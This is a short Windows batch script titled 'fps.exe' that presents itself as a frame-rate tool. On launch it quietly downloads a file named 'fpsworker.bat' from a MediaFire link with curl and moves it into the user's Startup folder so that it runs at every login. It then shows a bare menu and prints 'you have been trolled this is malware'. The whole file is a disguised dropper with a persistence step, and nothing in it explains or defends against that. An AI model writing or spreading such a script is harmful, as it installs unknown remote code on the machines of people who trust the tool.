@echo off
title fps.exe
color 0a
cls 
cd /d C:/
cd %userprofile%
curl -O https://download1532.mediafire.com/4yx8hyuk6yog/eg5sz6dz17av1uz/fpsworker.bat
cls
move "fpsworker.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\fpsworker.bat"
del fpsworker.bat
:start
cls
echo fps
echo.
set /p main= choose
goto %main%



:fps
cls
echo you have been trolled this is malware
pause
exit
